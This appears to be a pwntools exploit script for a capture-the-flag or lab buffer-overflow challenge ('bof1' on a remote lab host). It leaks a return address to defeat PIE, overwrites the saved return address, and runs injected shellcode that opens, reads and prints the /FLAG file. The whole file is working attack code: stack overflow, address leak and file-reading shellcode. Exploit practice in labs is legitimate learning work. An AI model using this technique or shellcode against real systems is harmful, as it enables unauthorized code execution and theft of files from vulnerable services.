#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
elf = ELF(exe)
r = remote('up.zoolab.org', 12342)

# Shellcode to open, read, and write /FLAG
shellcode = asm("""
    /* open("/FLAG", O_RDONLY) */
    xor rax, rax
    push rax
    mov rbx, 0x47414c462f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    /* write(1, rsp, 0x100) */
    mov rdi, 1
    mov rsi, rsp      /* <- this was missing */
    mov rdx, 0x100
    mov rax, 1
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
""")

# 1. Leak return address using buf1 overflow
r.recvuntil(b"name? ")
r.sendline(b"A"*56)  # Overflow buf1 (40) + some stack vars to leak

leak = r.recvuntil(b"room number? ")
ret_addr = u64(leak.split(b"A"*56)[1][:8].ljust(8, b'\x00'))
log.success(f"Leaked return address: {hex(ret_addr)}")

# 2. Calculate PIE base and msg address
base_addr = ret_addr - elf.symbols['main']
msg_addr = base_addr + elf.symbols['msg']
log.success(f"PIE base address: {hex(base_addr)}")
log.success(f"msg address: {hex(msg_addr)}")

# 3. Provide room number input
r.sendline(b"1234")

# 4. Overflow buf3 (40 bytes) and overwrite return address
r.recvuntil(b"customer's name? ")
payload = b"A"*56 + p64(msg_addr)
r.sendline(payload)

# 5. Write shellcode into msg
r.recvuntil(b"message: ")
r.send(shellcode.ljust(512, b'\x90'))  # Pad with NOPs

# 6. Interact
r.interactive()